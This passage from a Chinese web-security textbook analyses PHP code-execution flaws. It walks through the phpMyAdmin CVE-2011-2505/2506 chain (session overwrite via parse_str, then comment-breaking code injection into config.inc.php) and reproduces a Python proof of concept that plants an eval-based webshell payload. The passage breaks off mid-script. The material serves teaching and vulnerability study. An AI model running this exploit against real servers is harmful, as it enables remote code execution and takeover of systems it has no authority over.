其次，熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量的来源。
最后，养成初始化变量的好习惯。
14.3 代码执行漏洞
PHP中的代码执行情况非常灵活，但究其原因仍然离不开两个关键条件：第一是用
户能够控制的函数输入；第二是存在可以执行代码的危险函数。但PHP代码的执行过程
可能是曲折的，有些问题很隐蔽，不易被发现，要找出这些问题，对安全工程师的经验
有较高的要求。
14.3.1 “危险函数”执行代码
在前文中提到，文件包含漏洞是可以造成代码执行的。但在PHP中，能够执行代码
的方式远不止文件包含漏洞一种，比如危险函数popen()、sys-tem()、passthru()、
exec()等都可以直接执行系统命令。此外，eval()函数也可以执行PHP代码。还有一些比
较特殊的情况，比如允许用户上传PHP代码，或者是应用写入到服务器的文件内容和文
件类型可以由用户控制，都可能导致代码执行。
下面通过几个真实案例，来帮助深入理解PHP中可能存在的代码执行漏洞。
14.3.1.1 phpMyAdmin 3.4.3.1远程代码执行漏洞
在phpMyAdmin版本3.3.10.2与3.4.3.1以下存在一个变量覆盖漏洞，漏洞编号为：
CVE-2011-2505，漏洞代码存在于libraries/auth/swekey/swekey.auth.lib.php中。
if
(strstr($_SERVER['QUERY_STRING'],'session_to_
unset') != false)
{
parse_str($_SERVER['QUERY_STRING']);
session_write_close();
session_id($session_to_unset);
session_start();
$_SESSION = array();
session_write_close();
session_destroy();
exit;
}
这是一个典型的通过parse_str()覆盖变量的漏洞，但是这个函数的逻辑很短，到最
后直接就exit了，原本做不了太多事情。但是注意到Session变量是可以保存在服务器
端，并常驻内存的，因此通过覆盖$_SESSION变量将改变很多逻辑。
原本程序逻辑执行到session_destroy() 将正常销毁Session，但是在此之前
session_write_close()已经将Session保存下来，然后到session_id()处试图切换
Session。
这个漏洞导致的后果，就是所有从Session中取出的变量都将变得不再可信任，可
能会导致很多XSS、SQL注入等问题，但我们直接看由CVE-2011-2506导致的静态代码
注入——
在setup/lib/ConfigGenerator.class.php 中：
/**
* Creates config file
*
* @return string
*/
public static function getConfigFile()
{
$cf = ConfigFile::getInstance();
$crlf = (isset($_SESSION['eol']) &&
$_SESSION['eol'] == 'win') ? "\r\n" : "\n";
$c = $cf->getConfig();
// header
$ret = 'get('PMA_VERSION')
. ' setup script' . $crlf
. ' * Date: ' .
date(DATE_RFC1123) . $crlf
. ' */' . $crlf . $crlf;
// servers
if ($cf->getServerCount() > 0) {
$ret .= "/* Servers
configuration */$crlf\$i = 0;" . $crlf .
$crlf;
foreach ($c['Servers'] as $id =>
$server) {
$ret .= '/* Server: ' .
strtr($cf->getServerName($id), '*/', '-') .
" [$id] */" . $crlf
. '$i++;' . $crlf;
foreach ($server as $k =>
$v) {
$k = preg_replace('/[^A-
Za-z0-9_]/', '_', $k);
$ret .= "\$cfg['Servers']
[\$i]['$k'] = "
. (is_array($v) &&
self::_isZeroBasedArray($v)
?
self::_exportZeroBasedArray($v, $crlf)
:
var_export($v, true))
. ';' . $crlf;
}
$ret .= $crlf;
}
$ret .= '/* End of servers
configuration */' . $crlf . $crlf;
}
unset($c['Servers']);
// other settings
$persistKeys = $cf-
>getPersistKeysMap();
foreach ($c as $k => $v) {
$k = preg_replace('/[^A-Za-
z0-9_]/', '_', $k);
$ret .= self::_getVarExport($k,
$v, $crlf);
if (isset($persistKeys[$k])) {
unset($persistKeys[$k]);
}
}
// keep 1d array keys which are
present in $persist_keys (config.values.php)
foreach (array_keys($persistKeys) as
$k) {
if (strpos($k, '/') === false) {
$k = preg_replace('/[^A-Za-
z0-9_]/', '_', $k);
$ret .=
self::_getVarExport($k, $cf->getDefault($k),
$crlf);
}
}
$ret .= '?>';
return $ret;
}
其中，此处试图在代码中添加注释，但其拼接的是一个变量：
$ret .= '/* Server: ' . strtr($cf-
>getServerName($id), '*/', '-') . " [$id]
*/" . $crlf
需要注意的是，strtr()函数已经处理了变量$cf->getServerName($id)，防止该值中
包含有*/，从而关闭注释符；然而，紧随其后的[$id]却未做任何处理，它实际上是数组
变量 $c['Servers']的key。
变量$c则是函数返回的结果：$c = $cf->get-Config();
在libraries/config/ConfigFile.class.php中有getConfig()的实现：
/**
* Returns configuration array (full,
multidimensional format)
*
* @return array
*/
public function getConfig()
{
$c = $_SESSION[$this->id];
foreach ($this->cfgUpdateReadMapping as
$map_to => $map_from) {
PMA_array_write($map_to, $c,
PMA_array_read($map_from, $c));
PMA_array_remove($map_from, $c);
}
return $c;
}
最终发现$c是从Session中取得的，而我们通过前面的漏洞可以覆盖Session中的任
意变量，从而控制变量$c，最终注入“*/”闭合注释符，将PHP代码插入到
config/config.inc.php中并执行。
此漏洞的利用条件是config目录存在并可写，而很多时候管理员可能会在完成初始
化安装后，删除config目录。
国内安全研究者wofeiwo为此漏洞写了一段POC：
#!/usr/bin/env python
# coding=utf-8
# pma3 - phpMyAdmin3 remote code execute
exploit
# Author: wofeiwo
# Thx Superhei
# Tested on: 3.1.1, 3.2.1, 3.4.3
# CVE: CVE-2011-2505, CVE-2011-2506
# Date: 2011-07-08
# Have fun, DO *NOT* USE IT TO DO BAD THING.
#############################################
###
# Requirements: 1. "config" directory must
created&writeable in pma directory.
# 2. session.auto_start = 1
in php.ini configuration.
import os,sys,urllib2,re
def usage(program):
print "PMA3 (Version below 3.3.10.2 and
3.4.3.1) remote code
execute exploit"
print "Usage: %s " % program
print "Example: %s http://www.test.com/
phpMyAdmin" % program
sys.exit(0)
def main(args):
try:
if len(args) < 2:
usage(args[0])
if args[1][-1] == "/":
args[1] = args[1][:-1]
print "[+] Trying get form
token&session_id.."
content = urllib2.urlopen(args[1]+"/
index.php").read()
r1 = re.findall("token=(\w{32})",
content)
r2 =
re.findall("phpMyAdmin=(\w{32,40})", content)
if not r1:
r1 = re.findall("token\" value=
\"(\w{32})\"", content)
if not r2:
r2 = re.findall("phpMyAdmin\"
value=\"(\w{32,40})\"", content)
if len(r1) < 1 or len(r2) < 1:
print "[-] Cannot find form
token and session id...exit."
sys.exit(-1)
token = r1[0]
sessionid = r2[0]
print "[+] Token: %s , SessionID:
%s" % (token, sessionid)
print "[+] Trying to insert payload
in $_SESSION.."
uri = "/libraries/auth/swekey/
swekey.auth.lib.php?
session_to_unset=HelloThere&_
SESSION [ConfigFile0][Servers][*/
eval(getenv('HTTP_CODE'));/*][host]=Hacked+By
+PMA&_
SESSION[ConfigFile][Servers][*/
eval(getenv('HTTP_CODE'));/*][host]=Hacked+By
+PMA"
url = args[1]+uri
opener = urllib2.build_opener()
opener.addheaders.append(('Cookie',
'phpMyAdmin=%s;
pma_lang=en;
pma_mcrypt_iv=ILXfl5RoJxQ%%3D; PHPSESSID=
%s;' %
(sessionid, sessionid)))
urllib2.install_opener(opener)
urllib2.urlopen(url)
print "[+] Trying get webshell.."
postdata ="phpMyAdmin=
%s&tab_hash=&token=
%s&check_page_refresh=&DefaultLang
=en&Server
Default=0&eol=unix&submit_save=Save"
% (sessionid, token)
url = args[1]+"/setup/config.php"
# print "[+]Postdata: %s" % postdata
urllib2.urlopen(url, postdata)
print "[+] All done, pray for your
lucky!"
url = args[1]+"/config/